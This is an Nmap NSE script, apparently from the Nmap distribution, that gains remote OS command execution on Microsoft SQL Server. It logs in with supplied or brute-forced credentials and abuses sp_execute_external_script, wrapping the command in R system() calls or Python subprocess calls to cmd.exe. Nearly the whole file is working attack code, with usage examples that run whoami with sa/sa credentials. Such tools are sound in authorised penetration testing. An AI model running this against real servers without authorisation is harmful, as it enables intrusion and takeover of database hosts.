local mssql = require "mssql"
local nmap = require "nmap"
local stdnse = require "stdnse"
local string = require "string"

-- -*- mode: lua -*-
-- vim: set filetype=lua :

description = [[
Attempts to run system commands using Microsoft SQL Server Machine Learning Services with sp_execute_external_script.

For this script to work:
* The Advanced Analytics Extensions feature with at least one language must have been installed during SQL Server 2016+ setup.
* External scripts must have been enabled after setup and the server restarted.
* This script needs an account with the <code>EXECUTE ANY EXTERNAL SCRIPT</code> database permission.

SQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>
and/or <code>mssql.username</code> & <code>mssql.password</code>)
Run criteria:
* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).
* Port script: Will run against any services identified as SQL Servers, but only
if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>
and <code>mssql.instance-port</code> script arguments are NOT used.

When run, the script iterates over the credentials and attempts to run
the command until either all credentials are exhausted or until the
command is executed.

NOTE: Communication with instances via named pipes depends on the <code>smb</code>
library. To communicate with (and possibly to discover) instances via named pipes,
the host must have at least one SMB port (e.g. TCP 445) that was scanned and
found to be open. Additionally, named pipe connections may require Windows
authentication to connect to the Windows host (via SMB) in addition to the
authentication required to connect to the SQL Server instances itself. See the
documentation and arguments for the <code>smb</code> library for more information.

NOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate
with ports that were not included in the port list for the Nmap scan. This can
be disabled using the <code>mssql.scanned-ports-only</code> script argument.
]]

---
-- @usage
-- nmap -p 445 --script ms-sql-sp-execute-external-script --script-args=mssql.username=sa,mssql.password=sa,mssql.instance-all <host>
-- nmap -p 1433 --script ms-sql-sp-execute-external-script --script-args mssql.username=sa,mssql.password=sa,ms-sql-sp-execute-external-script.cmd="whoami" <host>
-- nmap -p 1433 --script ms-sql-sp-execute-external-script --script-args mssql.username=sa,mssql.password=sa,ms-sql-sp-execute-external-script.language=python <host>
--
-- @args ms-sql-sp-execute-external-script.cmd The OS command to run (default: ipconfig /all).
-- @args ms-sql-sp-execute-external-script.language The language used to run command. Supported langauges are Python and R (default: R).
--
-- @output
-- | ms-sql-sp-execute-external-script:
-- |   10.0.0.5\SEVENTEEN:
-- |     Language: R
-- |     Command: whoami
-- |     Output:
-- |       mssql\seventeen01
-- |   10.0.0.5\MSSQLSERVER:
-- |_    Procedure sp_execute_external_script disabled.
--
-- @xmloutput
-- <table key="10.0.0.5\SEVENTEEN">
--   <elem key="Language">R</elem>
--   <elem key="Command">whoami</elem>
--   <table key="Output">
--     <elem>mssql\seventeen01</elem>
--   </table>
-- </table>
-- <table key="10.0.0.5\MSSQLSERVER">
--   <elem>Procedure sp_execute_external_script disabled.</elem>
-- </table>

author = "James Otten"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {
  "intrusive",
}

dependencies = {
  "ms-sql-brute",
  "ms-sql-empty-password",
}

hostrule = mssql.Helper.GetHostrule_Standard()
portrule = mssql.Helper.GetPortrule_Standard()

local function escape_command (command)
  local escaped
  escaped = command:gsub('\\', '\\\\')
  escaped = escaped:gsub("'", "''")
  escaped = escaped:gsub('"', '\\"')
  return escaped
end

local function process_instance (instance)
  local status
  local result
  local query
  local script
  local permissionIssue = false
  local instanceOutput = stdnse.output_table()
  local language = stdnse.get_script_args {
    SCRIPT_NAME .. '.language',
    'mssql-sp-execute-external-script.language',
  } or 'r'
  local command = stdnse.get_script_args {
    SCRIPT_NAME .. '.cmd',
    'mssql-sp-execute-external-script.cmd',
  } or 'ipconfig /all'
  local escapedCommand = escape_command(command)

  if string.lower(language) == "python" then
    language = "Python"
    script = ('import subprocess as sp;p=sp.Popen("cmd.exe /c %s",stdout=sp.PIPE);OutputDataSet=pandas.DataFrame([str(p.stdout.read(),"utf-8").replace("\\r","")])'):format(escapedCommand)
  else
    language = 'R'
    script = ('OutputDataSet <- data.frame(paste(system("cmd.exe /c %s",intern=T), collapse="\n"))'):format(escapedCommand)
  end

  query = ("exec sp_execute_external_script @language=N'%s', @script=N'%s' WITH RESULT SETS (([output] nvarchar(max)))"):format(language, script)

  local creds = mssql.Helper.GetLoginCredentials_All(instance)
  if not creds then
    stdnse.verbose "Error: No login credentials."
  else
    for username, password in pairs(creds) do
      local helper = mssql.Helper:new()
      status, result = helper:ConnectEx(instance)
      if not status then
        stdnse.verbose("Error: " .. result)
        break
      end

      if status then
        status = helper:Login(username, password, nil, instance.host.ip)
      end

      if status then
        status, result = helper:Query(query)
      end
      helper:Disconnect()

      if status then
        instanceOutput["Language"] = language
        instanceOutput["Command"] = command
        instanceOutput["Output"] = mssql.Util.FormatOutputTable(result, false)
        break
      elseif result and result:match "language" then
        instanceOutput[#instanceOutput + 1] = string.format("Language '%s' is not supported/configured.", language)
        break
      elseif result and result:match "sp_configure" then
        instanceOutput[#instanceOutput + 1] = "Procedure sp_execute_external_script disabled."
        break
      elseif result and result:match "permission" then
        stdnse.verbose("User '%s' does not have EXECUTE ANY EXTERNAL SCRIPT on '%s'", username, instance:GetName())
        permissionIssue = true
      end
    end
  end

  if permissionIssue and #instanceOutput == 0 then
    instanceOutput[1] = "No users found with EXECUTE ANY EXTERNAL SCRIPT"
  end

  return instanceOutput
end

function action (host, port)
  local scriptOutput = stdnse.output_table()
  local status, instanceList = mssql.Helper.GetTargetInstances(host, port)

  if not status then
    return stdnse.format_output(false, instanceList)
  else
    for _, instance in pairs(instanceList) do
      local instanceOutput = process_instance(instance)
      if instanceOutput and #instanceOutput > 0 then
        scriptOutput[instance:GetName()] = instanceOutput
      end
    end

    if not (stdnse.get_script_args { SCRIPT_NAME .. '.language', 'mssql-sp-execute-external-script.language', }) then
      stdnse.verbose("Use --script-args=" .. SCRIPT_NAME .. ".language='<LANGUAGE>' to change language.")
    end
    if not (stdnse.get_script_args { SCRIPT_NAME .. '.cmd', 'mssql-sp-execute-external-script.cmd', }) then
      stdnse.verbose("(Use --script-args=" .. SCRIPT_NAME .. ".cmd='<CMD>' to change command.)")
    end
  end

  if #scriptOutput == 0 then
    return
  end

  return scriptOutput
end
